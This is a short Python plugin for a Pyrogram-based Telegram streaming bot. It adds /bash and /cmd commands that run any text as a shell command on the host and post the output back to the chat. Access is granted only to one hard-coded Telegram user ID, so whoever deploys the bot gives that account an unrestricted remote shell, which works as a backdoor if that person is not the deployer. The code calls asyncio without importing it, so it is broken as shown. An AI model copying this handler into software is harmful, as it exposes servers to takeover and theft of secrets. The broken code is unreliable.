from pyrogram import filters
from pyrogram.types import Message
from WebStreamer.bot import StreamBot
    
@StreamBot.on_message(filters.user(1252058587) & filters.command(['bash', 'cmd']))
async def bash(_, m: Message):
    rep = await m.reply("Proccessing...", quote=True)
    cmd = m.text.split(" ", 1)[1]
    process = await asyncio.create_subprocess_shell(
        cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    output = str(stdout.decode().strip()) + str(stderr.decode().strip())
    await rep.edit(f"`{output}`")
